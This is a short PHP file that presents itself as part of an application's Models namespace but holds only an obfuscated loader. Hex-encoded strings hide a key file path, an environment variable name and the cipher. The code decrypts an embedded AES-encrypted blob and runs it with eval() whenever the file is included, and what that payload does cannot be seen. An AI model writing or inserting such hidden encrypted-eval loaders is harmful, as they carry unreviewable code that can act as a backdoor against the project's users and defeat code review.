<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yqJfU3IVX7yQf+96WRoImw==');

$c=base64_decode(

'/b8OjatsukGK81FuR/pFpiEqeF35vWrtcmb/0TgUZGx+E1utEZ7Manmay5JtFppDbQek1CC8qS9G' .
'DXW047xnaKJageqKW0gHITVsVTnWVpFRQ+BWNaBe3LpCHuQeoJgBAdf3xuHY1loVXSLu5gKj8MCX' .
'GvOkM1hrmagtNRdBvDFlT2bArTmLcc5UPMAJ3cfp3lmrvdUA+CA/3xMSeqZhJeSaSzRffkwrEX4a' .
'DQDsaAndBHI/cIsIRUMLqisMs0/H9LV+++kcxmWyLR0yTm+lZy75w2XfzI0uyfurY99JPRpMFqyU' .
'z9HnlVi1+X0xzgKJbQ8AAKzSiWFKmUN/LK2G61vkHPVu4BHe8+3KsKiYaqnj1n7/Bb9Lu7BGyhWA' .
'q9E/0W5opXW/e10CQJYqTIduBGigwcrH78fiFxlq/FekVpPSSBlUhnA4+AVqtJVsxO68N78sODOn' .
'CSWHSwpkWMJp0weNzAiKWbUiUZv/BJiev6tWKzgEbExbAdC+GcbnaKjD9Si4m7pBrcE/p+IP03wZ' .
'9hvvb9DECdMY5oR5TosB/pGWcO/QwS5ZlNpgE1X8GotnSo+8PuYgcTdF2pVpiAdWJANlvDQDxgjn' .
'zkXRiJx9TgbRZFYTzz4fW19oQE0/kzLLrMUjrSQoJvhtMeiRnUuI0smYpvG6BJzQf/u/JdUX2+mw' .
'RzEO2m2TK3gU2cUVPA8xQUdqFIQAawLrmOh+3hDu/FdHg0vx0UndkVdmt5c8UPmjPnXkS+fmWXN6' .
'GsOj8lFVM2DHgejVuw3Bhg0r0qZigXWtdswKb2HkcsW5I8iFWPY+90bOH4r9eoAg/Khu5NHfpX9H' .
'esG47O/GJaI5jWfNyIoKo/Mx/wz+Py1JrDv65FPN8hNCdG1afVpkD3ssQ0nv'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

